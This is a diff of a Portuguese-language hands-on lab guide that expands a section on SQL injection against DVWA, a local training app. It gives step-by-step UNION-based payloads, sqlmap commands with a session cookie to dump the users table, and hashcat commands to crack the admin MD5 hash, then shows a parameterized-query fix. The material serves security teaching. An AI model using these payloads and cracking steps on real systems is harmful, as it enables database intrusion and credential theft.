@@ -66,46 +66,136 @@ Regra: **porta conhecida → use `-p`; porta desconhecida → descubra com `-p-`
 
 ---
 
-## Parte 2 — SQL Injection (SQLi) no DVWA (20 min)
+## Parte 2 — SQL Injection (SQLi) no DVWA (40 min)
 
-**O que é:** a aplicação monta uma consulta SQL juntando a sua entrada **sem tratar**. Você injeta SQL e muda o sentido da consulta. CWE-89.
+**O que é:** a aplicação monta uma consulta SQL **juntando a sua entrada como texto**, sem tratar. Se você colocar caracteres de SQL (como a aspa `'`), consegue **mudar o sentido da consulta** — ler dados que não deveria, burlar login, etc. É a CWE-89 e uma das falhas mais críticas.
 
-### 2.1 Testar manualmente
-1. No DVWA, vá em **SQL Injection**.
-2. No campo **User ID**, digite `1` e clique em Submit — retorna 1 usuário.
-3. Agora digite:
+### 2.1 Entenda a query por trás (o "porquê")
+
+Quando você digita um ID no DVWA, por baixo dos panos ele roda algo assim:
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '  SUA_ENTRADA  ';
+```
+Repare que a sua entrada entra **entre aspas**. Se você digitar `1`, vira:
+```sql
+... WHERE user_id = '1';
+```
+Mas se você digitar `1' OR '1'='1`, vira:
+```sql
+... WHERE user_id = '1' OR '1'='1';
+```
+Agora a condição `'1'='1'` é **sempre verdadeira** → o banco devolve **todos** os usuários. Foi você que "abriu a aspa" e injetou lógica nova. Esse é o coração do SQLi.
+
+### 2.2 Testar do zero (passo a passo)
+
+1. No DVWA (nível **Low**), vá em **SQL Injection**.
+2. **Comportamento normal:** no campo **User ID**, digite `1` e clique em Submit. Aparece 1 usuário (`First name` / `Surname`). Guarde essa imagem mental do "normal".
+3. **Testar se é injetável:** digite só uma aspa e Submit:
+   ```
+   1'
+   ```
+   **O que observar:** aparece um **erro de SQL** (algo como `You have an error in your SQL syntax...`) ou o resultado some. Erro = você quebrou a sintaxe = **é injetável**. (Se não der erro, o campo pode estar tratando a entrada.)
+4. **Confirmar a injeção** (condição sempre verdadeira):
    ```
    1' OR '1'='1
    ```
-   e Submit. **O que observar:** retornou **vários** usuários — a condição `'1'='1'` é sempre verdadeira. Isso confirma a injeção.
+   **O que observar:** retornam **vários** usuários. Confirmado.
 
-### 2.2 Automatizar com sqlmap
-1. Copie a URL da página (ex.): `http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit`
-2. Pegue o **cookie**: no Firefox, F12 → **Storage/Armazenamento → Cookies** → copie `PHPSESSID` e `security`.
-3. No terminal:
-   ```
-   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=XXXX; security=low" --batch --dbs
-   ```
-   **O que observar:** o sqlmap confirma a injeção e lista os bancos (ex.: `dvwa`).
-4. Extraia os usuários e senhas:
-   ```
-   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=XXXX; security=low" --batch -D dvwa -T users --dump
-   ```
-   **O que observar:** aparece a tabela `users` com `user` e `password` (hash **MD5**). Guarde o hash do **admin**.
+> 💡 Dica: no DVWA a SQLi é por **GET**, então dá para fazer tudo pela URL também: `.../vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit` (lembre de codificar espaços como `%20` se precisar).
 
-### 2.3 Quebrar o hash (bônus)
+### 2.3 Extrair dados de verdade com UNION (a parte importante)
+
+Confirmar a falha é só o começo. Para **extrair dados** usamos a técnica **UNION SELECT**, que "cola" o resultado de uma segunda consulta (sua) no resultado da primeira. Para funcionar, a sua consulta precisa ter o **mesmo número de colunas** que a original. Vamos descobrir isso em etapas:
+
+**Passo 1 — Descobrir quantas colunas a consulta tem** (com `ORDER BY`):
+```
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+```
+Vá aumentando o número. Quando der **erro** (ex.: no `3`), significa que a consulta tem **2 colunas** (o último que funcionou). O `-- -` no fim é um **comentário SQL**: ele "apaga" o resto da query original (a aspa que sobraria). *(No MySQL é traço-traço-espaço; por isso `-- -`.)*
+
+**Passo 2 — Ver onde cada coluna aparece na tela:**
+```
+0' UNION SELECT 1,2-- -
+```
+**O que observar:** aparece `First name: 1` e `Surname: 2`. Ou seja, a coluna 1 vira o "First name" e a 2 o "Surname". *(Usei `0'` — um ID que não existe — para a tela mostrar **só** os dados injetados, sem o usuário 1 no meio.)*
+
+**Passo 3 — Pegar informações do banco** (prova de que você controla a consulta):
+```
+0' UNION SELECT user(),version()-- -
+0' UNION SELECT database(),2-- -
+```
+**O que observar:** o usuário do banco (ex.: `root@localhost`), a versão do MySQL e o **nome do banco** (ex.: `dvwa`).
+
+**Passo 4 — Listar as tabelas do banco:**
+```
+0' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+```
+**O que observar:** aparecem as tabelas (ex.: `guestbook`, `users`). A tabela `users` é o alvo.
+
+**Passo 5 — Listar as colunas da tabela `users`:**
+```
+0' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+```
+**O que observar:** colunas como `user_id`, `first_name`, `user`, `password`, `avatar`. As que interessam: **`user`** e **`password`**.
+
+**Passo 6 — Extrair as credenciais (o prêmio):**
+```
+0' UNION SELECT user,password FROM users-- -
+```
+**O que observar:** a lista de usuários e seus **hashes de senha** (MD5). Guarde o hash do **admin** — vamos quebrá-lo no 2.5.
+
+> Resumo da técnica UNION: **conte as colunas (ORDER BY) → ache a posição visível (UNION SELECT 1,2) → navegue pelo `information_schema` (tabelas → colunas) → extraia os dados.** É sempre essa sequência.
+
+### 2.4 Automatizar com sqlmap (quando o manual fica repetitivo)
+
+O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado), então você fornece o **cookie da sessão**.
+
+**Pegar o cookie (passo a passo):**
+1. Esteja logado no DVWA no Firefox.
+2. Pressione **F12** → aba **Armazenamento** (Firefox) ou **Application** (Chrome) → **Cookies** → clique no `http://localhost:8081`.
+3. Copie o **valor** de `PHPSESSID` (ex.: `abc123...`) e confirme que existe `security = low`.
+
+**Rodar o sqlmap (de forma progressiva):**
+
+1. Detectar a injeção:
+   ```
+   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
+   ```
+2. Listar os bancos: adicione `--dbs`
+3. Listar as tabelas do `dvwa`: `-D dvwa --tables`
+4. Listar as colunas da `users`: `-D dvwa -T users --columns`
+5. Extrair só o que importa:
+   ```
+   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users -C user,password --dump
+   ```
+
+**O que cada parte faz:** `-u` = a URL/alvo · `--cookie` = sua sessão · `--batch` = responde "sim" sozinho · `--dbs/-D` = bancos · `--tables/-T` = tabelas · `--columns/-C` = colunas · `--dump` = extrai os dados.
+
+### 2.5 Quebrar o hash (do hash ao texto claro)
+
+Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat):
 ```
 echo 'HASH_DO_ADMIN' > hash.txt
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-(Se o rockyou estiver zipado: `gunzip /usr/share/wordlists/rockyou.txt.gz`.)
+Se a wordlist estiver zipada: `gunzip /usr/share/wordlists/rockyou.txt.gz` antes. Veja o resultado com `hashcat -m 0 hash.txt --show`. **O que observar:** a senha em texto claro aparece ao lado do hash (a do admin costuma ser `password`).
 
-### 2.4 Como corrigir 🟢
-Use **consultas parametrizadas** (prepared statements) — o dado nunca vira código:
+### 2.6 Como corrigir 🟢
+
+A raiz do problema é **misturar dado com código**. A correção é **separar** usando **consultas parametrizadas** (prepared statements) — o `?` é um espaço reservado e o valor entra **como dado**, nunca como SQL:
 ```php
-$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
+// 🔴 Vulnerável
+$sql = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";
+
+// 🟢 Seguro
+$stmt = $pdo->prepare("SELECT first_name,last_name FROM users WHERE user_id = ?");
 $stmt->execute([$id]);
 ```
+Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalmente** por esse texto como ID — a injeção deixa de funcionar.
+
+> 🎯 **Desafio extra:** mude o DVWA para **Medium** e tente de novo. Lá a entrada vai por POST e há um filtro simples — você vai precisar adaptar os payloads (ex.: sem aspas, usando o `id` numérico). É assim que se treina para a prova.
 
 ---
 
